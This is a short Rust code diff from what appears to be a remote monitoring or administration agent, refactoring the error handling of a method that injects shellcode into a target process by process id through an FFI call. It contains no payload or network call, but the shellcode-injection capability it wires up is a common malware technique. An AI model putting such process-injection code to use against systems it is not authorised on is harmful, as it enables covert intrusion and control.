@@ -1,4 +1,3 @@
-use anyhow::anyhow;
 use m0n1t0r_common::{Error, Result as AppResult, process::execute::Output};
 use remoc::{
     chmux::ReceiverStream,
@@ -82,15 +81,12 @@ impl m0n1t0r_common::process::Agent for AgentObj {
         let (tx, rx) = oneshot::channel();
 
         thread::spawn(move || {
-            let _ = tx.send(
-                match ffi::inject_shellcode_by_id(pid, shellcode, ep_offset, parameter)? {
-                    true => Ok(()),
-                    false => Err(Error::from(anyhow!("Failed to inject shellcode"))),
-                },
-            );
+            let _ = tx.send(ffi::inject_shellcode_by_id(
+                pid, shellcode, ep_offset, parameter,
+            )?);
             Ok::<_, anyhow::Error>(())
         });
-        Ok(rx.await??.into())
+        Ok(rx.await?.into())
     }
 
     async fn id_by_name(&self, name: String) -> AppResult<u32> {
@@ -119,7 +115,7 @@ mod ffi {
             shellcode: Vec<u8>,
             ep_offset: u32,
             parameter: Vec<u8>,
-        ) -> Result<bool>;
+        ) -> Result<()>;
 
         fn id_by_name(name: String) -> Result<u32>;
     }
